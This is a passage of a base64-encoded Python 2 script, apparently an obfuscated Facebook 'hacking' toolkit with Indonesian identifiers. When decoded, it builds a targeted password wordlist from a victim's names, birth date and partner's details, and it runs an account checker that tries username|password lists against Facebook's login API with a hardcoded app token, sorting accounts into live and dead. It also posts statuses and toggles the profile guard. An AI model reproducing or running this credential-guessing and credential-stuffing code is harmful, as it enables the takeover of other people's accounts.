3RlbSgncmVzZXQnKQoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWxvZ2luKCkKCW9zLnN5c3RlbSgncmVzZXQnKQoJcHJpbnQgbG9nbwoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0xLlwwMzNbMTs5N20gQ3JlYXRlIFBvc3QiCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTIuXDAzM1sxOzk3bSBDcmVhdGUgV29yZGxpc3QiCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTMuXDAzM1sxOzk3bSBBY2NvdW50IENoZWNrZXIiCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTQuXDAzM1sxOzk3bSBTZWUgbXkgZ3JvdXAgbGlzdCIKCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtNS5cMDMzWzE7OTdtIFByb2ZpbGUgR3VhcmQiCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkxbTAuXDAzM1sxOzk3bSBCYWNrIgoJcHJpbnQgIuKVkSIKCXBpbGloX2xhaW4oKQojLy8vLy8vLy8vLy8vCmRlZiBwaWxpaF9sYWluKCk6CglvdGhlciA9IHJhd19pbnB1dCgiXDAzM1sxOzk3beKVmuKVkFwwMzNbMTs5MW1FbnRlciBcMDMzWzE7OTdtIikKCWlmIG90aGVyID09IiI6CgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiCgkJcGlsaWhfbGFpbigpCgllbGlmIG90aGVyID09IjEiOgoJCXN0YXR1cygpCgllbGlmIG90aGVyID09IjIiOgoJCXdvcmRsaXN0KCkKCWVsaWYgb3RoZXIgPT0iMyI6CgkJY2hlY2tfYWt1bigpCgllbGlmIG90aGVyID09IjQiOgoJCWdydXBzYXlhKCkKCWVsaWYgb3RoZXIgPT0iNSI6CgkJZ3VhcmQoKQoJZWxpZiBvdGhlciA9PSIwIjoKCQltZW51KCkKCWVsc2U6CgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiCgkJcGlsaWhfbGFpbigpCgkJCiMjIyMjIFNUQVRVUyAjIyMjIwpkZWYgc3RhdHVzKCk6Cglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMSkKCQlsb2dpbigpCglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXByaW50IGxvZ28KCW1zZz1yYXdfaW5wdXQoJ1wwMzNbMTs5MW1bK10gXDAzM1sxOzkybVR5cGUgc3RhdHVzIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAnKQoJaWYgbXNnID09ICIiOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIERvbid0IGJlIGVtcHR5IgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJbGFpbigpCgllbHNlOgoJCXJlcyA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvZmVlZD9tZXRob2Q9UE9TVCZtZXNzYWdlPSIrbXNnKyImYWNjZXNzX3Rva2VuPSIrdG9rZXQpCgkJb3AgPSBqc29uLmxvYWRzKHJlcy50ZXh0KQoJCWphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUNyZWF0ZSBcMDMzWzE7OTdtLi4uJykKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQlwcmludCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1TdGF0dXMgSURcMDMzWzE7OTFtIDogXDAzM1sxOzk3bSIrb3BbJ2lkJ10KCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWxhaW4oKQoJCQojIyMjIyMjIyMjIyBDUkVBVEUgV09SRExJU1QgIyMjIyMjIyMjIwpkZWYgd29yZGxpc3QoKToKCW9zLnN5c3RlbSgncmVzZXQnKQoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWxvZ2luKCkKCXRyeToKCQlvcy5zeXN0ZW0oJ3Jlc2V0JykKCQlwcmludCBsb2dvCgkJcHJpbnQgIlwwMzNbMTs5MW1bP10gXDAzM1sxOzkybUZpbGwgaW4gdGhlIGNvbXBsZXRlIGRhdGEgb2YgdGhlIHRhcmdldCBiZWxvdyIKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQlhID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaXJzdCBOYW1lIFwwMzNbMTs5N206ICIpCgkJZmlsZSA9IG9wZW4oYSsiLnR4dCIsICd3JykKCQliPXJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtTWlkZGxlIE5hbWUgXDAzM1sxOzk3bTogIikKCQljPXJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtTGFzdCBOYW1lIFwwMzNbMTs5N206ICIpCgkJZD1yYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybU5pY2sgbmFtZSBcMDMzWzE7OTdtOiAiKQoJCWU9cmF3X2lucHV0KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1EYXRlIG9mIEJpcnRoID5cMDMzWzE7OTZtZXg6IHxERE1NWVl8IFwwMzNbMTs5N206ICIpCgkJZj1lWzA6Ml0KCQlnPWVbMjo0XQoJCWg9ZVs0Ol0KCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQlwcmludCgiXDAzM1sxOzkxbVs/XSBcMDMzWzE7OTNtaWYgeW91J3JlIHNpbmdsZSwganVzdCBza2lwIDp2IikKCQlpPXJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtR2lybGZyaWVuZCBOYW1lIFwwMzNbMTs5N206ICIpCgkJaj1yYXdfaW5wdXQoIlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybUdpcmxmcmllbmQgTmlja05hbWUgXDAzM1sxOzk3bTogIikKCQlrPXJhd19pbnB1dCgiXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtQmlydGhkYXkgR2lybGZyaWVuZCA+XDAzM1sxOzk2bWV4OiB8RERNTVlZfCBcMDMzWzE7OTdtOiAiKQoJCWphbGFuKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUNyZWF0ZSBcMDMzWzE7OTdtLi4uJykKCQlsPWtbMDoyXQoJCW09a1syOjRdCgkJbj1rWzQ6XQoJCWZpbGUud3JpdGUoIiVzJXNcbiVzJXMlcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzXG4lcyVzJXNcbiVzJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlc1xuJXMlcyVzXG4lcyVzJXNcbiVzJXMlc1xuJXMlcyVzXG4lcyVzJXNcbiVzJXMlc1xuJXMlcyVzXG4lcyVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXNcbiVzJXMiICUgKGEsYyxhLGIsYixhLGIsYyxjLGEsYyxiLGEsYSxiLGIsYyxjLGEsZCxiLGQsYyxkLGQsZCxkLGEsZCxiLGQsYyxhLGUsYSxmLGEsZyxhLGgsYixlLGIsZixiLGcsYixoLGMsZSxjLGYsYyxnLGMsaCxkLGUsZCxmLGQsZyxkLGgsZSxhLGYsYSxnLGEsaCxhLGUsYixmLGIsZyxiLGgsYixlLGMsZixjLGcsYyxoLGMsZSxkLGYsZCxnLGQsaCxkLGQsZCxhLGYsZyxhLGcsaCxmLGcsZixoLGYsZixnLGYsZyxoLGcsZyxoLGYsaCxnLGgsaCxoLGcsZixhLGcsaCxiLGYsZyxiLGcsaCxjLGYsZyxjLGcsaCxkLGYsZyxkLGcsaCxhLGksYSxqLGEsayxpLGUsaSxqLGksayxiLGksYixqLGIsayxjLGksYyxqLGMsayxlLGssaixhLGosYixqLGMsaixkLGosaixrLGEsayxiLGssYyxrLGQsayxrLGksbCxpLG0saSxuLGosbCxqLG0saixuLGosaykpCgkJd2cgPSAwCgkJd2hpbGUgKHdnIDwgMTAwKToKCQkJd2cgPSB3ZyArIDEKCQkJZmlsZS53cml0ZShhICsgc3RyKHdnKSArICdcbicpCgkJZW4gPSAwCgkJd2hpbGUgKGVuIDwgMTAwKToKCQkJZW4gPSBlbiArIDEKCQkJZmlsZS53cml0ZShpICsgc3RyKGVuKSArICdcbicpCgkJd29yZCA9IDAKCQl3aGlsZSAod29yZCA8IDEwMCk6CgkJCXdvcmQgPSB3b3JkICsgMQoJCQlmaWxlLndyaXRlKGQgKyBzdHIod29yZCkgKyAnXG4nKQoJCWdlbiA9IDAKCQl3aGlsZSAoZ2VuIDwgMTAwKToKCQkJZ2VuID0gZ2VuICsgMQoJCQlmaWxlLndyaXRlKGogKyBzdHIoZ2VuKSArICdcbicpCgkJZmlsZS5jbG9zZSgpCgkJdGltZS5zbGVlcCgxLjUpCgkJcHJpbnQgNDIqIlwwMzNbMTs5N23ilZAiCgkJcHJpbnQgKCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1TYXZlZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtICVzLnR4dCIgJWEpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlsYWluKCkKCWV4Y2VwdCBJT0Vycm9yLCBlOgoJCXByaW50KCJcMDMzWzE7OTFtWyFdIEZhaWxlZCIpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlsYWluKCkKCiMjIyMjIENIRUNLRVIgIyMjIyMKZGVmIGNoZWNrX2FrdW4oKToKCW9zLnN5c3RlbSgncmVzZXQnKQoJdHJ5OgoJCXRva2V0PW9wZW4oJ2xvZ2luLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOgoJCXByaW50IlwwMzNbMTs5MW1bIV0gVG9rZW4gbm90IGZvdW5kIgoJCW9zLnN5c3RlbSgncm0gLXJmIGxvZ2luLnR4dCcpCgkJdGltZS5zbGVlcCgxKQoJCWxvZ2luKCkKCW9zLnN5c3RlbSgncmVzZXQnKQoJcHJpbnQgbG9nbwoJcHJpbnQgIlwwMzNbMTs5MW1bP10gXDAzM1sxOzkybUNyZWF0ZSBpbiBmaWxlXDAzM1sxOzkxbSA6IFwwMzNbMTs5N211c2VybmFtZXxwYXNzd29yZCIKCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJbGl2ZSA9IFtdCgljZWsgPSBbXQoJZGllID0gW10KCXRyeToKCQlmaWxlID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1GaWxlIHBhdGggXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIpCgkJbGlzdCA9IG9wZW4oZmlsZSwncicpLnJlYWRsaW5lcygpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCAoIlwwMzNbMTs5MW1bIV0gRmlsZSBub3QgZm91bmQiKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJbGFpbigpCglwZW1pc2FoID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1TZXBhcmF0b3IgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIpCglqYWxhbignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1TdGFydCBcMDMzWzE7OTdtLi4uJykKCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIgoJZm9yIG1la2kgaW4gbGlzdDoKCQl1c2VybmFtZSwgcGFzc3dvcmQgPSAobWVraS5zdHJpcCgpKS5zcGxpdChzdHIocGVtaXNhaCkpCgkJdXJsID0gImh0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0iKyh1c2VybmFtZSkrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzc3dvcmQpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiCgkJZGF0YSA9IHJlcXVlc3RzLmdldCh1cmwpCgkJbXBzaCA9IGpzb24ubG9hZHMoZGF0YS50ZXh0KQoJCWlmICdhY2Nlc3NfdG9rZW4nIGluIG1wc2g6CgkJCWxpdmUuYXBwZW5kKHBhc3N3b3JkKQoJCQlwcmludCJcMDMzWzE7OTdtWyBcMDMzWzE7OTJtTGl2ZVwwMzNbMTs5N20gXSBcMDMzWzE7OTdtIit1c2VybmFtZSsifCIrcGFzc3dvcmQKCQllbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBtcHNoWyJlcnJvcl9tc2ciXToKCQkJY2VrLmFwcGVuZChwYXNzd29yZCkKCQkJcHJpbnQiXDAzM1sxOzk3bVsgXDAzM1sxOzkzbUNoZWNrXDAzM1sxOzk3bSBdIFwwMzNbMTs5N20iK3VzZXJuYW1lKyJ8IitwYXNzd29yZAoJCWVsc2U6CgkJCWRpZS5hcHBlbmQocGFzc3dvcmQpCgkJCXByaW50IlwwMzNbMTs5N21bIFwwMzNbMTs5MW1EaWVcMDMzWzE7OTdtIF0gXDAzM1sxOzk3bSIrdXNlcm5hbWUrInwiK3Bhc3N3b3JkCglwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCXByaW50IlwwMzNbMTs5MW1bK10gXDAzM1sxOzkybVRvdGFsXDAzM1sxOzkxbSA6IFwwMzNbMTs5N21MaXZlPVwwMzNbMTs5Mm0iK3N0cihsZW4obGl2ZSkpKyIgXDAzM1sxOzk3bUNoZWNrPVwwMzNbMTs5M20iK3N0cihsZW4oY2VrKSkrIiBcMDMzWzE7OTdtRGllPVwwMzNbMTs5MW0iK3N0cihsZW4oZGllKSkKCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCglsYWluKCkKCQojIyMjIyBHUlVQIFNBWUEgIyMjIyMKZGVmIGdydXBzYXlhKCk6Cglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMSkKCQlsb2dpbigpCgl0cnk6CgkJb3MubWtkaXIoJ291dCcpCglleGNlcHQgT1NFcnJvcjoKCQlwYXNzCglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXByaW50IGxvZ28KCXRyeToKCQl1aCA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvZ3JvdXBzP2FjY2Vzc190b2tlbj0nK3Rva2V0KQoJCWd1ZCA9IGpzb24ubG9hZHModWgudGV4dCkKCQlmb3IgcCBpbiBndWRbJ2RhdGEnXToKCQkJbmFtYSA9IHBbIm5hbWUiXQoJCQlpZCA9IHBbImlkIl0KCQkJZj1vcGVuKCdvdXQvR3J1cGlkLnR4dCcsJ3cnKQoJCQlsaXN0Z3J1cC5hcHBlbmQoaWQpCgkJCWYud3JpdGUoaWQgKyAnXG4nKQoJCQlwcmludCAiXDAzM1sxOzk3bVsgXDAzM1sxOzkybU15R3JvdXBcMDMzWzE7OTdtIF0gIitzdHIoaWQpKyIgPT4gIitzdHIobmFtYSkKCQlwcmludCA0MioiXDAzM1sxOzk3beKVkCIKCQlwcmludCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbCBHcm91cCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJXMiJShsZW4obGlzdGdydXApKQoJCXByaW50KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1TYXZlZCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtb3V0L0dydXBpZC50eHQiKQoJCWYuY2xvc2UoKQoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJbGFpbigpCglleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0LEVPRkVycm9yKToKCQlwcmludCgiXDAzM1sxOzkxbVshXSBTdG9wcGVkIikKCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQoJCWxhaW4oKQoJZXhjZXB0IEtleUVycm9yOgoJCW9zLnJlbW92ZSgnb3V0L0dydXBpZC50eHQnKQoJCXByaW50KCdcMDMzWzE7OTFtWyFdIEdyb3VwIG5vdCBmb3VuZCcpCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlsYWluKCkKCWV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLkNvbm5lY3Rpb25FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtW+Kcll0gTm8gQ29ubmVjdGlvbiIKCQlrZWx1YXIoKQoJZXhjZXB0IElPRXJyb3I6CgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gRXJyb3IiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlsYWluKCkKCQkKIyMjIyMgUFJPRklMIEdVQVJEICMjIyMjCmRlZiBndWFyZCgpOgoJZ2xvYmFsIHRva2V0Cglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXRyeToKCQl0b2tldD1vcGVuKCdsb2dpbi50eHQnLCdyJykucmVhZCgpCglleGNlcHQgSU9FcnJvcjoKCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCIKCQlvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQoJCXRpbWUuc2xlZXAoMSkKCQlsb2dpbigpCglvcy5zeXN0ZW0oJ3Jlc2V0JykKCXByaW50IGxvZ28KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTJtMS5cMDMzWzE7OTdtIEFjdGl2YXRlIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0yLlwwMzNbMTs5N20gTm90IGFjdGl2YXRlIgoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5MW0wLlwwMzNbMTs5N20gQmFjayIKCXByaW50ICLilZEiCglnID0gcmF3X2lucHV0KCJcMDMzWzE7OTdt4pWa4pWQXDAzM1sxOzkxbUQgXDAzM1sxOzk3bSIpCglpZiBnID09ICIxIjoKCQlha3RpZiA9ICJ0cnVlIgoJCWdheih0b2tldCwgYWt0aWYpCgllbGlmIGcgPT0gIjIiOgoJCW5vbiA9ICJmYWxzZSIKCQlnYXoodG9rZXQsIG5vbikKCWVsaWYgZyA9PSIwIjoKCQlsYWluKCkKCWVsaWYgZyA9PSIiOgoJCWtlbHVhcigpCgllbHNlOgoJCWtlbHVhcigpCgkKZGVmIGdldF91c2VyaWQodG9rZXQpOgoJdXJsID0gImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0lcyIldG9rZXQKCXJlcyA9IHJlcXVlc3RzLmdldCh1cmwpCgl1aWQgPSBqc29uLmxvYWRzKHJlcy50ZXh0KQoJcmV0dXJuIHVpZFsiaWQiXQoJCQpkZWYgZ2F6KHRva2V0LCBlbmFibGUgPSBUcnVlKToKCWlkID0gZ2V0X3VzZXJpZCh0b2tldCkKCWRhdGEgPSAndmFyaWFibGVzPXsiMCI6eyJpc19zaGllbGRlZCI6ICVzLCJzZXNzaW9uX2lkIjoiOWI3ODE5MWMtODRmZC00YWI2LWIwYWEtMTliMzlmMDRhNmJjIiwiYWN0b3JfaWQiOiIlcyIsImNsaWVudF9tdXRhdGlvbl9pZCI6ImIwMzE2ZGQ2LTNmZDYtNGJlYi1hZWQ0LWJiMjljNWRjNjRiMCJ9fSZtZXRob2Q9cG9zdCZkb2NfaWQ9MTQ3NzA0MzI5MjM2NzE4MyZxdWVyeV9uYW1lPUlzU2hpZWxkZWRTZXRNdXRhdGlvbiZzdHJpcF9kZWZhdWx0cz10cnVlJnN0cmlwX251bGxzPXRydWUmbG9jYWxlPWVuX1VTJmNsaWVudF9jb3VudHJ5X2NvZGU9VVMmZmJfYXBpX3JlcV9mcmllbmRseV9uYW1lPUlzU2hpZWxkZWRTZXRNdXRhdGlvbiZmYl9hcGlfY2FsbGVyX2NsYXNzPUlzU2hpZWxkZWRTZXRNdXRhdGlvbicgJSAoZW5hYmxlLCBzdHIoaWQpKQoJaGVhZGVycyA9IHsiQ29udGVudC1UeXBlIiA6ICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiLCAiQXV0aG9yaXphdGlvbiIgOiAiT0F1dGggJXMiICUgdG9rZXR9Cgl1cmwgPSAiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vZ3JhcGhxbCIKCXJlcyA9IHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhID0gZGF0YSwgaGVhZGVycyA9IGhlYWRlcnMpCglwcmludChyZXMudGV4dCkKCWlmICciaXNfc2hpZWxkZWQiOnRydWUnIGluIHJlcy50ZXh0OgoJCW9zLnN5c3RlbSgncmVzZXQnKQoJCXByaW50IGxvZ28KCQlwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTJtQWN0aXZhdGUiCgkJcmF3X2lucHV0KCJcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikKCQlsYWluKCkKCWVsaWYgJyJpc19zaGllbGRlZCI6ZmFsc2UnIGluIHJlcy50ZXh0OgoJCW9zLnN5c3RlbSgncmVzZXQnKQoJCXByaW50IGxvZ28KCQlwcmludCJcMDMzWzE7OTFtW1wwMzNbMTs5Nm3inJNcMDMzWzE7OTFtXSBcMDMzWzE7OTFtTm90IGFjdGl2YXRlIgoJCXJhd19pbnB1dCgiXG5cMDMzWzE7OTFtWyBcMDMzWzE7OTdtQmFjayBcMDMzWzE7OTFtXSIpCgkJbGFpbigpCgllbHNlOgoJCXByaW50ICJcMDMzWzE7OTFtWyFdIEVycm9yIgoJCWtlbHVhcigpCgkKbGlzZW5zaSgpCg=='))
